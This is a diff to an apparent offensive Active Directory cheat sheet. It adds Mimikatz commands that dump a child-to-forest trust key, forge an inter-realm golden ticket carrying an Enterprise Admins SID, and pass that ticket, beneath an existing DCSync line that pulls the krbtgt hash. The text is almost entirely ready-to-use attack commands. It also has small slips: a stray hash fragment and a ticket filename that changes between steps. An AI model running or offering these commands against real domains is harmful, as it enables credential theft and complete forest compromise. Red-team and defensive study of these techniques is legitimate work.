@@ -105,7 +105,22 @@ lsadump::dcsync /domain:target.domain.com /user:prod\krbtgt
 
 ## Trust Key between Forest and Child
 
+### Get the trusted key
+
 ```csharp
  Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.lab.test.local
+```
+
+### Get a ticket
+
+```csharp
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:childomain.com /sid:<childomain.com SID> /sids:<main domain SID-519> /rc4:ea9815a
+<trusted key hash> /service:krbtgt /target:maindomain.com /ticket:C:\temp\trust_tkt.kirbi"'
+```
+
+### Pass the ticket
+
+```csharp
+ Invoke-Mimikatz -Command '"kerberos::ptt krbtgt_tkt.kirbi"'
 ```
 
